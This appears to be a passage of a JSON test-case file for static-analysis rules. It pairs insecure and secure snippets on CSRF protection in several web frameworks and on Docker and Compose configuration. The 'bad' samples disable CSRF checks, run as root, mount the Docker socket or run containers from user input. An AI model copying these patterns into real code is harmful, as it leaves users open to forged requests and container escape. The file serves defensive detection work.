    "code": "using System.Diagnostics;\nusing Microsoft.AspNetCore.Mvc;\nusing MvcMovie.Models;\n\npublic class HomeController : Controller\n{\n    private readonly ILogger<HomeController> _logger;\n\n    public HomeController(ILogger<HomeController> logger)\n    {\n        _logger = logger;\n    }\n\n    public IActionResult Index()\n    {\n        return View();\n    }\n\n    //ruleid: mvc-missing-antiforgery\n    [HttpPost]\n    public IActionResult CreateBad(User user){\n      CreateUser(user);\n    }\n\n    //ruleid: mvc-missing-antiforgery\n    [HttpDelete]\n    public IActionResult DeleteBad(User user){\n      DeleteUser(user);\n    }\n}",
    "language": "csharp",
    "description": "state-changing methods without ValidateAntiForgeryToken"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Request Forgery",
    "type": "good",
    "code": "using System.Diagnostics;\nusing Microsoft.AspNetCore.Mvc;\nusing MvcMovie.Models;\n\npublic class HomeController : Controller\n{\n    //ok: mvc-missing-antiforgery\n    [HttpPost]\n    [ValidateAntiForgeryToken]\n    public IActionResult CreateGood(User user){\n      CreateUser(user);\n    }\n\n    //ok: mvc-missing-antiforgery\n    [HttpPost]\n    //strict type checking enforces CORS preflight for non-simple HTTP requests\n    [Consumes(\"application/json\")]\n    public IActionResult CreateGood(User user){\n      CreateUser(user);\n    }\n\n    //ok: mvc-missing-antiforgery\n    [ValidateAntiForgeryToken]\n    [HttpDelete]\n    public IActionResult DeleteGood(User user){\n      CreateUser(user);\n    }\n}",
    "language": "csharp",
    "description": "add ValidateAntiForgeryToken or strict Content-Type checking"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Request Forgery",
    "type": "bad",
    "code": "// cf. https://find-sec-bugs.github.io/bugs.htm#SPRING_CSRF_UNRESTRICTED_REQUEST_MAPPING\n\n@Controller\npublic class Controller {\n\n    // ruleid: unrestricted-request-mapping\n    @RequestMapping(\"/path\")\n    public void writeData() {\n        // State-changing operations performed within this method.\n    }\n\n    // ruleid: unrestricted-request-mapping\n    @RequestMapping(value = \"/path\")\n    public void writeData2() {\n        // State-changing operations performed within this method.\n    }\n}",
    "language": "java",
    "description": "RequestMapping without specifying HTTP method"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Request Forgery",
    "type": "good",
    "code": "@Controller\npublic class Controller {\n\n    /**\n     * For methods without side-effects use either\n     * RequestMethod.GET, RequestMethod.HEAD, RequestMethod.TRACE, or RequestMethod.OPTIONS.\n     */\n    // ok: unrestricted-request-mapping\n    @RequestMapping(value = \"/path\", method = RequestMethod.GET)\n    public String readData() {\n        // No state-changing operations performed within this method.\n        return \"\";\n    }\n\n    /**\n     * For state-changing methods use either\n     * RequestMethod.POST, RequestMethod.PUT, RequestMethod.DELETE, or RequestMethod.PATCH.\n     */\n    // ok: unrestricted-request-mapping\n    @RequestMapping(value = \"/path\", method = RequestMethod.POST)\n    public void writeData3() {\n        // State-changing operations performed within this method.\n    }\n}",
    "language": "java",
    "description": "specify HTTP method in RequestMapping"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Request Forgery",
    "type": "bad",
    "code": "package com.example.securingweb;   // cf. https://spring.io/guides/gs/securing-web/\n\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.security.config.annotation.web.builders.HttpSecurity;\nimport org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;\nimport org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;\nimport org.springframework.security.core.userdetails.User;\nimport org.springframework.security.core.userdetails.UserDetails;\nimport org.springframework.security.core.userdetails.UserDetailsService;\nimport org.springframework.security.provisioning.InMemoryUserDetailsManager;\n\n@Configuration\n@EnableWebSecurity\npublic class WebSecurityConfigCsrfDisable extends WebSecurityConfigurerAdapter {\n    @Override\n    protected void configure(HttpSecurity http) throws Exception {\n        // ruleid: spring-csrf-disabled\n        http\n            .csrf().disable()\n            .authorizeRequests()\n                .antMatchers(\"/\", \"/home\").permitAll()\n                .anyRequest().authenticated()\n                .and()\n            .formLogin()\n                .loginPage(\"/login\")\n                .permitAll()\n                .and()\n            .logout()\n                .permitAll();\n    }\n}",
    "language": "java",
    "description": "explicitly disabling CSRF protection"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Request Forgery",
    "type": "good",
    "code": "public class WebSecurityConfigOK extends WebSecurityConfigurerAdapter {\n    @Override\n    protected void configure(HttpSecurity http) throws Exception {\n        // ok: spring-csrf-disabled\n        http\n            .authorizeRequests()\n                .antMatchers(\"/\", \"/home\").permitAll()\n                .anyRequest().authenticated()\n                .and()\n            .formLogin()\n                .loginPage(\"/login\")\n                .permitAll()\n                .and()\n            .logout()\n                .permitAll();\n    }\n}",
    "language": "java",
    "description": "CSRF protection enabled by default"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Request Forgery",
    "type": "bad",
    "code": "from django.http import HttpResponse\nfrom django.views.decorators.csrf import csrf_exempt\n\n# ruleid: no-csrf-exempt\n@csrf_exempt\ndef my_view(request):\n    return HttpResponse('Hello world')\n\nimport django\n\n# ruleid: no-csrf-exempt\n@django.views.decorators.csrf.csrf_exempt\ndef my_view2(request):\n    return HttpResponse('Hello world')",
    "language": "python",
    "description": "using @csrf_exempt decorator"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Request Forgery",
    "type": "good",
    "code": "from django.http import HttpResponse\n\n# ok: no-csrf-exempt\ndef my_view(request):\n    return HttpResponse('Hello world')",
    "language": "python",
    "description": "remove csrf_exempt decorator"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Request Forgery",
    "type": "bad",
    "code": "from pyramid.csrf import CookieCSRFStoragePolicy\n\n\ndef includeme_bad(config):\n    config.set_csrf_storage_policy(CookieCSRFStoragePolicy())\n    # ruleid: pyramid-csrf-check-disabled-globally\n    config.set_default_csrf_options(require_csrf=False)",
    "language": "python",
    "description": "disabling CSRF checks globally"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Request Forgery",
    "type": "good",
    "code": "from pyramid.csrf import CookieCSRFStoragePolicy\n\n\ndef includeme_good(config):\n    config.set_csrf_storage_policy(CookieCSRFStoragePolicy())\n    # ok: pyramid-csrf-check-disabled-globally\n    config.set_default_csrf_options(require_csrf=True)",
    "language": "python",
    "description": "enable CSRF checks"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Request Forgery",
    "type": "bad",
    "code": "from pyramid.view import view_config\n\n\n@view_config(\n    route_name='home_bad1',\n    # ruleid: pyramid-csrf-check-disabled\n    require_csrf=False,\n    renderer='my_app:templates/mytemplate.jinja2'\n)\ndef my_bad_home1(request):\n    try:\n        query = request.dbsession.query(models.MyModel)\n        one = query.filter(models.MyModel.name == 'one').one()\n    except SQLAlchemyError:\n        return Response(\"Database error\", content_type='text/plain', status=500)\n    return {'one': one, 'project': 'my_proj'}",
    "language": "python",
    "description": "disabling CSRF for specific view"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Request Forgery",
    "type": "good",
    "code": "from pyramid.view import view_config\n\n\n@view_config(\n    route_name='home_bad1',\n    # ok: pyramid-csrf-check-disabled\n    require_csrf=True,\n    renderer='my_app:templates/mytemplate.jinja2'\n)\ndef my_good_home1(request):\n    try:\n        query = request.dbsession.query(models.MyModel)\n        one = query.filter(models.MyModel.name == 'one').one()\n    except SQLAlchemyError:\n        return Response(\"Database error\", content_type='text/plain', status=500)\n    return {'one': one, 'project': 'my_proj'}",
    "language": "python",
    "description": "enable CSRF for view"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Request Forgery",
    "type": "bad",
    "code": "from pyramid.view import view_config\n\n\n@view_config(\n    route_name='home_bad1',\n    # ruleid: pyramid-csrf-origin-check-disabled\n    check_origin=False,\n    renderer='my_app:templates/mytemplate.jinja2'\n)\ndef my_bad_home1(request):\n    try:\n        query = request.dbsession.query(models.MyModel)\n        one = query.filter(models.MyModel.name == 'one').one()\n    except SQLAlchemyError:\n        return Response(\"Database error\", content_type='text/plain', status=500)\n    return {'one': one, 'project': 'my_proj'}",
    "language": "python",
    "description": "disabling origin check for CSRF token"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Request Forgery",
    "type": "good",
    "code": "from pyramid.view import view_config\n\n\n@view_config(\n    route_name='home_bad1',\n    # ok: pyramid-csrf-origin-check-disabled\n    check_origin=True,\n    renderer='my_app:templates/mytemplate.jinja2'\n)\ndef my_good_home1(request):\n    try:\n        query = request.dbsession.query(models.MyModel)\n        one = query.filter(models.MyModel.name == 'one').one()\n    except SQLAlchemyError:\n        return Response(\"Database error\", content_type='text/plain', status=500)\n    return {'one': one, 'project': 'my_proj'}",
    "language": "python",
    "description": "enable origin check"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Request Forgery",
    "type": "bad",
    "code": "from pyramid.csrf import CookieCSRFStoragePolicy\n\n\ndef includeme_bad(config):\n    config.set_csrf_storage_policy(CookieCSRFStoragePolicy())\n    # ruleid: pyramid-csrf-origin-check-disabled-globally\n    config.set_default_csrf_options(check_origin=False)",
    "language": "python",
    "description": "disabling origin check globally"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Request Forgery",
    "type": "good",
    "code": "from pyramid.csrf import CookieCSRFStoragePolicy\n\n\ndef includeme_good(config):\n    config.set_csrf_storage_policy(CookieCSRFStoragePolicy())\n    # ok: pyramid-csrf-origin-check-disabled-globally\n    config.set_default_csrf_options(check_origin=True)",
    "language": "python",
    "description": "enable origin check globally"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Request Forgery",
    "type": "bad",
    "code": "import flask\nfrom flask import response as r\n\napp = flask.Flask(__name__)\n# ruleid:flask-wtf-csrf-disabled\napp.config['WTF_CSRF_ENABLED'] = False\n\n# ruleid:flask-wtf-csrf-disabled\napp.config[\"WTF_CSRF_ENABLED\"] = False\n\n# ruleid: flask-wtf-csrf-disabled\napp.config.WTF_CSRF_ENABLED = False\n\n# DICT UPDATE\n################\n\napp.config.update(\n    SECRET_KEY='192b9bdd22ab9ed4d12e236c78afcb9a393ec15f71bbf5dc987d54727823bcbf',\n    # ruleid: flask-wtf-csrf-disabled\n    WTF_CSRF_ENABLED = False,\n    TESTING=False\n)\n\n# FROM OBJECT\n################\n\n# custom class\nappconfig = MyAppConfig()\n# ruleid: flask-wtf-csrf-disabled\nappconfig.WTF_CSRF_ENABLED = False\n\napp.config.from_object(appconfig)\n\n# this file itself\nSECRET_KEY = 'development key'\n# ruleid: flask-wtf-csrf-disabled\nWTF_CSRF_ENABLED = False\n\napp.config.from_object(__name__)\n\n# FROM MAPPING\n################\n\napp.config.from_mapping(\n    SECRET_KEY='192b9bdd22ab9ed4d12e236c78afcb9a393ec15f71bbf5dc987d54727823bcbf',\n    # ruleid: flask-wtf-csrf-disabled\n    WTF_CSRF_ENABLED = False,\n)",
    "language": "python",
    "description": "disabling WTF_CSRF_ENABLED"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Request Forgery",
    "type": "good",
    "code": "import flask\n\napp = flask.Flask(__name__)\n\n# ok: flask-wtf-csrf-disabled\napp.config[\"WTF_CSRF_ENABLED\"] = True\n\n# ok: flask-wtf-csrf-disabled\napp.config[\"SESSION_COOKIE_SECURE\"] = False\n\n# ok: flask-wtf-csrf-disabled\napp.config.WTF_CSRF_ENABLED = True\n\n# It's okay to do this during testing\napp.config.update(\n    SECRET_KEY='192b9bdd22ab9ed4d12e236c78afcb9a393ec15f71bbf5dc987d54727823bcbf',\n    # ok: flask-wtf-csrf-disabled\n    WTF_CSRF_ENABLED = False,\n    TESTING=True\n)\n\n# It's okay to do this during testing\napp.config.from_mapping(\n    SECRET_KEY='192b9bdd22ab9ed4d12e236c78afcb9a393ec15f71bbf5dc987d54727823bcbf',\n    # ok: flask-wtf-csrf-disabled\n    WTF_CSRF_ENABLED = False,\n    TESTING=True\n)",
    "language": "python",
    "description": "enable CSRF or only disable for testing"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Request Forgery",
    "type": "bad",
    "code": "<?php\n\nuse Symfony\\Component\\Form\\AbstractType;\nuse Symfony\\Component\\OptionsResolver\\OptionsResolver;\nuse Symfony\\Component\\HttpKernel\\DependencyInjection\\Extension;\nuse Symfony\\Component\\DependencyInjection\\ContainerBuilder;\nuse Symfony\\Component\\DependencyInjection\\Extension\\PrependExtensionInterface;\nuse Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\nuse Symfony\\Bundle\\FrameworkBundle\\Controller\\Controller;\n\n\nclass Type extends AbstractType\n{\n  public function configureOptions(OptionsResolver $resolver)\n  {\n      // ruleid: symfony-csrf-protection-disabled\n    $resolver->setDefaults([\n      'data_class'      => Type::class,\n      'csrf_protection' => false\n    ]);\n\n    // ruleid: symfony-csrf-protection-disabled\n    $resolver->setDefaults(array(\n      'csrf_protection' => false\n    ));\n\n\n    $csrf = false;\n    // ruleid: symfony-csrf-protection-disabled\n    $resolver->setDefaults([\n      'csrf_protection' => $csrf\n    ]);\n  }\n}\n\nclass TestExtension extends Extension implements PrependExtensionInterface\n{\n  public function prepend(ContainerBuilder $container)\n  {\n\n    // ruleid: symfony-csrf-protection-disabled\n    $container->prependExtensionConfig('framework', ['csrf_protection' => false,]);\n\n    // ruleid: symfony-csrf-protection-disabled\n    $container->prependExtensionConfig('framework', ['something_else' => true, 'csrf_protection' => false,]);\n\n    $csrfOption = false;\n    // ruleid: symfony-csrf-protection-disabled\n    $container->prependExtensionConfig('framework', ['csrf_protection' => $csrfOption,]);\n\n    // ruleid: symfony-csrf-protection-disabled\n    $container->loadFromExtension('framework', ['csrf_protection' => false,]);\n  }\n}\n\nclass MyController1 extends AbstractController\n{\n  public function action()\n  {\n    // ruleid: symfony-csrf-protection-disabled\n    $this->createForm(TaskType::class, $task, [\n      'other_option' => false,\n      'csrf_protection' => false,\n    ]);\n\n    // ruleid: symfony-csrf-protection-disabled\n    $this->createForm(TaskType::class, $task, array(\n      'csrf_protection' => false,\n    ));\n\n    $csrf = false;\n    // ruleid: symfony-csrf-protection-disabled\n    $this->createForm(TaskType::class, $task, array(\n      'csrf_protection' => $csrf,\n    ));\n  }\n}",
    "language": "php",
    "description": "disabling csrf_protection in forms or configuration"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Request Forgery",
    "type": "good",
    "code": "<?php\n\nuse Symfony\\Component\\Form\\AbstractType;\nuse Symfony\\Component\\OptionsResolver\\OptionsResolver;\n\nclass Type extends AbstractType\n{\n  public function configureOptions(OptionsResolver $resolver)\n  {\n    // ok: symfony-csrf-protection-disabled\n    $resolver->setDefaults([\n      'csrf_protection' => true\n    ]);\n\n    // ok: symfony-csrf-protection-disabled\n    $resolver->setDefaults([\n      'data_class' => Type::class,\n    ]);\n\n    // ok: symfony-csrf-protection-disabled\n    $resolver->setDefaults($options);\n  }\n}\n\nclass TestExtension extends Extension implements PrependExtensionInterface\n{\n  public function prepend(ContainerBuilder $container)\n  {\n    // ok: symfony-csrf-protection-disabled\n    $container->loadFromExtension('framework', ['csrf_protection' => null,]);\n\n    // ok: symfony-csrf-protection-disabled\n    $container->prependExtensionConfig('framework', ['csrf_protection' => true,]);\n\n    // ok: symfony-csrf-protection-disabled\n    $container->prependExtensionConfig('framework', ['csrf_protection' => null,]);\n\n    // ok: symfony-csrf-protection-disabled\n    $container->prependExtensionConfig('something_else', ['csrf_protection' => false,]);\n  }\n}\n\nclass MyController1 extends AbstractController\n{\n  public function action()\n  {\n    // ok: symfony-csrf-protection-disabled\n    $this->createForm(TaskType::class, $task, ['csrf_protection' => true]);\n\n    // ok: symfony-csrf-protection-disabled\n    $this->createForm(TaskType::class, $task, ['other_option' => false]);\n  }\n}",
    "language": "php",
    "description": "enable CSRF protection"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Request Forgery",
    "type": "bad",
    "code": "<?php\n\n// ruleid: wp-csrf-audit\ncheck_ajax_referer( 'wpforms-admin', 'nonce', false );",
    "language": "php",
    "description": "check_ajax_referer with false third argument"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Request Forgery",
    "type": "good",
    "code": "<?php\n\n// ok: wp-csrf-audit\ncheck_ajax_referer( 'wpforms-admin', 'nonce', true );\n\n\n// ok: wp-csrf-audit\ncheck_ajax_referer( 'wpforms-admin', 'nonce' );\n\n?>",
    "language": "php",
    "description": "check_ajax_referer with die enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Request Forgery",
    "type": "bad",
    "code": "package main\n\nimport (\n\t\"log\"\n\t\"net/http\"\n\n\t\"github.com/gorilla/websocket\"\n)\n\nvar upgrader2 = websocket.Upgrader{\n\tReadBufferSize:  1024,\n\tWriteBufferSize: 1024,\n}\n\nfunc handler_doesnt_check_origin(w http.ResponseWriter, r *http.Request) {\n\t// ruleid: websocket-missing-origin-check\n\tconn, err := upgrader2.Upgrade(w, r, nil)\n\tif err != nil {\n\t\tlog.Println(err)\n\t\treturn\n\t}\n}",
    "language": "go",
    "description": "WebSocket upgrade without CheckOrigin"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Request Forgery",
    "type": "good",
    "code": "package main\n\nimport (\n\t\"log\"\n\t\"net/http\"\n\n\t\"github.com/gorilla/websocket\"\n)\n\nvar upgrader = websocket.Upgrader{\n\tCheckOrigin: func(r *http.Request) bool {\n\t\treturn true\n\t},\n\tReadBufferSize:  1024,\n\tWriteBufferSize: 1024,\n}\n\nvar upgrader2 = websocket.Upgrader{\n\tReadBufferSize:  1024,\n\tWriteBufferSize: 1024,\n}\n\nfunc handler_check_origin(w http.ResponseWriter, r *http.Request) {\n\t// ok: websocket-missing-origin-check\n\tconn, err := upgrader.Upgrade(w, r, nil)\n\tif err != nil {\n\t\tlog.Println(err)\n\t\treturn\n\t}\n}\n\nfunc handler_check_origin2(w http.ResponseWriter, r *http.Request) {\n\tupgrader2.CheckOrigin = func(r *http.Request) bool { return true }\n\t// ok: websocket-missing-origin-check\n\tconn, err := upgrader2.Upgrade(w, r, nil)\n\tif err != nil {\n\t\tlog.Println(err)\n\t\treturn\n\t}\n}",
    "language": "go",
    "description": "WebSocket upgrade with CheckOrigin"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Docker Configurations",
    "type": "bad",
    "code": "FROM busybox\n\nRUN git clone https://github.com/returntocorp/semgrep\nRUN pip3 install semgrep\nRUN semgrep -f p/xss\nUSER swuser\nUSER root\n\nUSER user1\n# ruleid: last-user-is-root\nUSER root",
    "language": "dockerfile",
    "description": "Dockerfile - last user is root"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Docker Configurations",
    "type": "good",
    "code": "FROM busybox\n\nRUN git clone https://github.com/returntocorp/semgrep\nRUN pip3 install semgrep\nUSER root\nRUN apt-get update && apt-get install -y some-package\nUSER appuser",
    "language": "dockerfile",
    "description": "Dockerfile - last user is non-root"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Docker Configurations",
    "type": "bad",
    "code": "# ruleid: missing-image-version\nFROM debian\n\n# ruleid: missing-image-version\nFROM nixos/nix\n\n# ruleid: missing-image-version\nFROM debian AS blah\n\n# ruleid: missing-image-version\nFROM nixos/nix AS build\n\n# ruleid: missing-image-version\nFROM --platform=linux/amd64 debian\n\n# ruleid: missing-image-version\nFROM --platform=linux/amd64 debian as name",
    "language": "dockerfile",
    "description": "Dockerfile - missing image version"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Docker Configurations",
    "type": "good",
    "code": "# ok: missing-image-version\nFROM debian:jessie\n\n# ok: missing-image-version\nFROM nixos/nix:2.7.0\n\n# ok: missing-image-version\nFROM debian:jessie AS blah\n\n# ok: missing-image-version\nFROM nixos/nix:2.7.0 AS build\n\n# ok: missing-image-version\nFROM --platform=linux/amd64 debian:jessie\n\n# ok: missing-image-version\nFROM --platform=linux/amd64 debian:jessie as name\n\n# ok: missing-image-version\nFROM python:3.10.1-alpine3.15@sha256:4be65b406f7402b5c4fd5df7173d2fd7ea3fdaa74d9c43b6ebd896197a45c448\n\n# ok: missing-image-version\nFROM python@sha256:4be65b406f7402b5c4fd5df7173d2fd7ea3fdaa74d9c43b6ebd896197a45c448\n\n# ok: missing-image-version\nFROM scratch",
    "language": "dockerfile",
    "description": "Dockerfile - explicit image version"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Docker Configurations",
    "type": "bad",
    "code": "# ruleid: avoid-latest-version\nFROM debian:latest\n\n# ruleid: avoid-latest-version\nFROM myregistry.local/testing/test-image:latest\n\n# ruleid: avoid-latest-version\nFROM debian:latest as blah\n\n# ruleid: avoid-latest-version\nFROM myregistry.local/testing/test-image:latest as blah",
    "language": "dockerfile",
    "description": "Dockerfile - using latest tag"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Docker Configurations",
    "type": "good",
    "code": "# ok: avoid-latest-version\nFROM debian:jessie\n\n# ok: avoid-latest-version\nFROM myregistry.local/testing/test-image:42ee222\n\n# ok: avoid-latest-version\nFROM debian:jessie as blah2\n\n# ok: avoid-latest-version\nFROM myregistry.local/testing/test-image:2a4af68 as blah2",
    "language": "dockerfile",
    "description": "Dockerfile - specific version tag"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Docker Configurations",
    "type": "bad",
    "code": "FROM busybox\n\n# ruleid: use-absolute-workdir\nWORKDIR usr/src/app\n\nENV dirpath=bar\n# ruleid: use-absolute-workdir\nWORKDIR ${dirpath}",
    "language": "dockerfile",
    "description": "Dockerfile - relative WORKDIR"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Docker Configurations",
    "type": "good",
    "code": "FROM busybox\n\n# ok: use-absolute-workdir\nWORKDIR /usr/src/app\n\nENV dirpath=/bar\n# ok: use-absolute-workdir\nWORKDIR ${dirpath}",
    "language": "dockerfile",
    "description": "Dockerfile - absolute WORKDIR"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Docker Configurations",
    "type": "bad",
    "code": "FROM busybox\n\n# ruleid: prefer-copy-over-add\nADD http://foo bar\n\n# ruleid: prefer-copy-over-add\nADD https://foo bar\n\n# ruleid: prefer-copy-over-add\nADD foo.tar.gz bar\n\n# ruleid: prefer-copy-over-add\nADD foo.bz2 bar",
    "language": "dockerfile",
    "description": "Dockerfile - using ADD for remote files"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Docker Configurations",
    "type": "good",
    "code": "FROM busybox\n\n# ok: prefer-copy-over-add\nADD foo bar\n\n# ok: prefer-copy-over-add\nADD foo* /mydir/\n\n# ok: prefer-copy-over-add\nADD hom?.txt /mydir/o\n\n# ok: prefer-copy-over-add\nADD arr[[]0].txt /mydir/o\n\n# ok: prefer-copy-over-add\nADD --chown=55:mygroup files* /somedir/\n\n# ok: prefer-copy-over-add\nADD --chown=bin files* /somedir/",
    "language": "dockerfile",
    "description": "Dockerfile - using COPY or ADD for local files"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Docker Configurations",
    "type": "bad",
    "code": "FROM busybox\n\n# ruleid: use-workdir\nRUN cd semgrep && git clone https://github.com/returntocorp/semgrep",
    "language": "dockerfile",
    "description": "Dockerfile - using RUN cd"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Docker Configurations",
    "type": "good",
    "code": "FROM busybox\n\n# ok: use-workdir\nRUN pip3 install semgrep && cd ..\n\n# ok: use-workdir\nRUN semgrep -f p/xss\n\n# ok: use-workdir\nRUN blah\n\n# ok: use-workdir\nRUN blah blahcd",
    "language": "dockerfile",
    "description": "Dockerfile - using WORKDIR"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Docker Configurations",
    "type": "bad",
    "code": "FROM debian\n\n# ruleid:avoid-apt-get-upgrade\nRUN apt-get update && apt-get upgrade\n\n# ruleid:avoid-apt-get-upgrade\nRUN apt-get update && apt-get upgrade -y\n\n# ruleid:avoid-apt-get-upgrade\nRUN apt-get update && apt-get dist-upgrade\n\n# ruleid:avoid-apt-get-upgrade\nRUN apt-get upgrade",
    "language": "dockerfile",
    "description": "Dockerfile - using apt-get upgrade"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Docker Configurations",
    "type": "good",
    "code": "FROM debian\n\n# ok: avoid-apt-get-upgrade\nRUN apt-get update",
    "language": "dockerfile",
    "description": "Dockerfile - only updating package lists"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Docker Configurations",
    "type": "bad",
    "code": "FROM busybox\n\n# ruleid: nonsensical-command\nRUN top\n\n# ruleid: nonsensical-command\nRUN kill 1234\n\n# ruleid: nonsensical-command\nRUN ifconfig\n\n# ruleid: nonsensical-command\nRUN ps -ef\n\n# ruleid: nonsensical-command\nRUN vim /var/log/www/error.log",
    "language": "dockerfile",
    "description": "Dockerfile - nonsensical commands"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Docker Configurations",
    "type": "good",
    "code": "FROM busybox\n\n# ok: nonsensical-command\nRUN git clone https://github.com/returntocorp/semgrep\n\n# ok: nonsensical-command\nRUN pip3 install semgrep\n\n# ok: nonsensical-command\nRUN semgrep -f p/xss",
    "language": "dockerfile",
    "description": "Dockerfile - appropriate container commands"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Docker Configurations",
    "type": "bad",
    "code": "# ruleid: avoid-platform-with-from\nFROM --platform=x86 busybox\n\n# ruleid: avoid-platform-with-from\nFROM --platform=x86 busybox:1.34\n\n# ruleid: avoid-platform-with-from\nFROM --platform=x86 busybox AS bb\n\n# ruleid: avoid-platform-with-from\nFROM --platform=x86 busybox:1.34 AS bb",
    "language": "dockerfile",
    "description": "Dockerfile - using --platform with FROM"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Docker Configurations",
    "type": "good",
    "code": "# ok: avoid-platform-with-from\nFROM busybox\n\n# ok: avoid-platform-with-from\nFROM busybox:1.34\n\n# ok: avoid-platform-with-from\nFROM busybox AS bb\n\n# ok: avoid-platform-with-from\nFROM busybox:1.34 AS bb",
    "language": "dockerfile",
    "description": "Dockerfile - FROM without platform restriction"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Docker Configurations",
    "type": "bad",
    "code": "version: \"3.9\"\nservices:\n  # ok: privileged-service\n  web:\n    image: nginx:alpine\n  worker:\n    image: my-worker-image:latest\n    # ruleid:privileged-service\n    privileged: true\n  # ok: privileged-service\n  db:\n    image: mysql",
    "language": "yaml",
    "description": "Docker Compose - privileged service"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Docker Configurations",
    "type": "good",
    "code": "version: \"3.9\"\nservices:\n  web:\n    image: nginx:alpine\n  worker:\n    image: my-worker-image:latest\n    privileged: false\n  db:\n    image: mysql",
    "language": "yaml",
    "description": "Docker Compose - service without privileged mode"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Docker Configurations",
    "type": "bad",
    "code": "version: \"3.9\"\nservices:\n  # ruleid: writable-filesystem-service\n  web:\n    image: nginx:alpine\n  # ruleid: writable-filesystem-service\n  worker:\n    image: my-worker-image:latest\n    read_only: false",
    "language": "yaml",
    "description": "Docker Compose - writable filesystem"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Docker Configurations",
    "type": "good",
    "code": "version: \"3.9\"\nservices:\n  # ok: writable-filesystem-service\n  db:\n    image: mysql\n    read_only: true",
    "language": "yaml",
    "description": "Docker Compose - read-only filesystem"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Docker Configurations",
    "type": "bad",
    "code": "version: \"3.9\"\nservices:\n  service02:\n    image: my-worker-image:latest\n    # ruleid: exposing-docker-socket-volume\n    volumes:\n      - /tmp/foo:/tmp/foo\n      - /var/run/docker.sock:/var/run/docker.sock\n  service05:\n    image: ubuntu\n    # ruleid: exposing-docker-socket-volume\n    volumes:\n      - /tmp/foo:/tmp/foo\n      - /run/docker.sock:/run/docker.sock\n  service14:\n    image: redis:6\n    # ruleid: exposing-docker-socket-volume\n    volumes:\n      - /var/run/docker.sock\n  service22:\n    image: debian:bullseye\n    # ruleid: exposing-docker-socket-volume\n    volumes:\n      - source: /var/run/docker.sock\n  service23:\n    image: debian:buster\n    # ruleid: exposing-docker-socket-volume\n    volumes:\n      - source: /var/run/docker.sock\n        target: /var/run/docker.sock",
    "language": "yaml",
    "description": "Docker Compose - exposing Docker socket"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Docker Configurations",
    "type": "good",
    "code": "version: \"3.9\"\nservices:\n  service01:\n    image: nginx:alpine\n    # ok: exposing-docker-socket-volume\n    volumes:\n      - /tmp/foo:/tmp/foo\n      - /tmp/bar:/tmp/bar\n  service28:\n    image: mysql:latest\n    # ok: exposing-docker-socket-volume\n    volumes:\n      - source: /tmp/foo\n  service29:\n    image: postgres:latest\n    # ok: exposing-docker-socket-volume\n    volumes:\n      - source: /tmp/foo\n        target: /tmp/bar\n      - source: /tmp/bar\n        target: /tmp/foo",
    "language": "yaml",
    "description": "Docker Compose - no Docker socket exposure"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Docker Configurations",
    "type": "bad",
    "code": "import docker\nclient = docker.from_env()\n\ndef bad1(user_input):\n    # ruleid: docker-arbitrary-container-run\n    client.containers.run(user_input, 'echo hello world')\n\ndef bad2(user_input):\n    # ruleid: docker-arbitrary-container-run\n    client.containers.create(user_input, 'echo hello world')",
    "language": "python",
    "description": "Python Docker SDK - arbitrary container run"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Docker Configurations",
    "type": "good",
